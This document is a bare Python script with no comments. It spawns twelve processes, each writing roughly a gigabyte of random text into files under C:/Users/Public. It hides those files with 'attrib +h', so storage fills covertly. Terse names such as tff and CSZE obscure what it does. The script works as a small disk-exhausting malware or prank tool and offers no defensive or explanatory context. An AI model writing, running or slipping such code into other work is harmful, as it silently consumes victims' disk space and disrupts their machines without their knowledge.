import os
import string
import random
import platform
import multiprocessing as mp

i = 0
GB = 1000 ** 3
CSZE = 100
os_name = platform.system()


def tff():
    c = string.printable
    return "".join(random.choices(c, k=len(c))) * 1000


def changeOS():
    drive = ""
    if os_name == "Windows":
        drive = "C:"
    if os_name == "Linux":
        pass
    return drive


def writeFile(i):
    filename = changeOS() + f"/Users/Public/.00{i}"
    with open(filename, "w", buffering=CSZE * 100) as file:
        os.system("attrib +h " + filename)
        while True:
            text = tff()
            for _ in range(100):
                file.write(text)
            if os.path.getsize(filename) >= GB:
                file.flush()
                break


def main():
    
    changeOS()
    p = []
    for x in range(0, 12):
        p.append(mp.Process(target=writeFile, args = {f"{x}000"}))
        p[x].start()




if __name__ == "__main__":
    main()